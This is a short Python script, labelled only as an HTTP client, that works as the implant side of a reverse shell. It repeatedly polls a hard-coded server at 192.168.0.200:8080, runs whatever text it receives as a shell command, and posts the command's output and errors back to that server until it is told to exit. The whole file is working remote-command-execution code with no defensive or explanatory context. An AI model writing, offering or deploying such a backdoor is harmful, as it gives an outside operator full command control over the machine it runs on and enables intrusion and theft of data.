#!/usr/bin/env python

#Python 3
#Http client

import requests
import time
import subprocess
import sys
SERVER_IP = "192.168.0.200"
PORT = 8080

URL = "http://{}:{}".format(SERVER_IP, PORT)

while(True):
    try:
        req = requests.get(URL, verify=False)
        command = req.text
        print("command ", command)
        if 'exit' in command:
            break
        else:
            cmd = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            post_response = requests.post(url=URL, data=cmd.stdout.read())
            post_response = requests.post(url=URL, data=cmd.stderr.read())
        #time.sleep(3)
    except KeyboardInterrupt:
        print("Shutting down the HTTP client")
        sys.exit(1)
